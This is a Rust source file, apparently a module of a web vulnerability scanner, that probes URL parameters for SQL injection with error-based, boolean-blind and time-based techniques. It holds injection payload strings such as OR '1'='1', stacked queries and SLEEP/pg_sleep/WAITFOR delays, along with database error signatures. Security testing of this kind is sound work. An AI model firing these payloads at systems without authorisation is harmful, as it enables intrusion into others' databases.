use colored::*;
use crate::core::client::HttpClient;
use crate::core::analyzer::Analyzer;

/// SQL Injection detection — error-based, boolean blind, time-based
pub async fn detect(target: &str) -> anyhow::Result<()> {
    println!("{} Testing: SQL Injection", "[*]".yellow());

    let params = Analyzer::extract_params(target);
    if params.is_empty() {
        println!("{} No parameters found for SQLi testing", "[i]".cyan());
        return Ok(());
    }

    let client = HttpClient::new()?;

    // SQL error signatures
    let error_sigs: Vec<&str> = vec![
        "you have an error in your sql syntax",
        "unclosed quotation mark",
        "quoted string not properly terminated",
        "syntax error at or near",
        "mysql_fetch",
        "pg_query",
        "ORA-01756",
        "SQLite3::query",
        "microsoft ole db provider for sql server",
        "SQLSTATE[",
        "Warning: mysql",
        "valid MySQL result",
        "MySqlClient",
        "com.mysql.jdbc",
        "org.postgresql",
    ];

    for (param_name, original_val) in &params {
        // Phase 1: Error-based detection
        let error_payloads = vec![
            format!("{}'", original_val),
            format!("{}\"", original_val),
            format!("{}' OR '1'='1", original_val),
            format!("{}' AND '1'='2", original_val),
            format!("{}) OR 1=1--", original_val),
            format!("{}'; SELECT 1--", original_val),
        ];

        for payload in &error_payloads {
            let url = Analyzer::inject_param(target, param_name, payload)?;
            if let Ok(result) = Analyzer::send_and_analyze(&client, &url, "").await {
                let body_lower = result.response_body.to_lowercase();
                for sig in &error_sigs {
                    if body_lower.contains(sig) {
                        println!(
                            "{} CONFIRMED: SQL Injection in param '{}' (error-based)",
                            "[!]".red().bold(), param_name
                        );
                        println!("    Payload: {}", payload);
                        println!("    Error: {}", sig);
                        return Ok(());
                    }
                }
            }
        }

        // Phase 2: Boolean blind — compare true vs false conditions
        let true_payload = format!("{}'AND'1'='1", original_val);
        let false_payload = format!("{}'AND'1'='2", original_val);

        let true_url = Analyzer::inject_param(target, param_name, &true_payload)?;
        let false_url = Analyzer::inject_param(target, param_name, &false_payload)?;
        let orig_url = Analyzer::inject_param(target, param_name, &original_val)?;

        if let (Ok(true_r), Ok(false_r), Ok(orig_r)) = (
            Analyzer::send_and_analyze(&client, &true_url, "").await,
            Analyzer::send_and_analyze(&client, &false_url, "").await,
            Analyzer::send_and_analyze(&client, &orig_url, "").await,
        ) {
            let orig_len = orig_r.response_body.len();
            let true_len = true_r.response_body.len();
            let false_len = false_r.response_body.len();

            // True condition should match original, false should differ
            let true_diff = (true_len as i64 - orig_len as i64).unsigned_abs();
            let false_diff = (false_len as i64 - orig_len as i64).unsigned_abs();

            if true_diff < 50 && false_diff > 200 {
                println!(
                    "{} CONFIRMED: SQL Injection in param '{}' (boolean blind)",
                    "[!]".red().bold(), param_name
                );
                println!("    True condition matches original (diff: {} bytes)", true_diff);
                println!("    False condition differs significantly (diff: {} bytes)", false_diff);
                return Ok(());
            }
        }

        // Phase 3: Time-based blind
        let time_payloads = vec![
            format!("{}'AND SLEEP(5)--", original_val),
            format!("{}' AND pg_sleep(5)--", original_val),
            format!("{}'; WAITFOR DELAY '0:0:5'--", original_val),
            format!("{}'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", original_val),
        ];

        let baseline = Analyzer::send_and_analyze(&client, target, "").await?;

        for payload in &time_payloads {
            let url = Analyzer::inject_param(target, param_name, payload)?;
            if let Ok(result) = Analyzer::send_and_analyze(&client, &url, "").await {
                if result.response_time_ms > baseline.response_time_ms + 4500 {
                    println!(
                        "{} CONFIRMED: SQL Injection in param '{}' (time-based blind)",
                        "[!]".red().bold(), param_name
                    );
                    println!("    Payload: {}", payload);
                    println!("    Delay: {}ms (baseline: {}ms)", result.response_time_ms, baseline.response_time_ms);
                    return Ok(());
                }
            }
        }
    }

    Ok(())
}
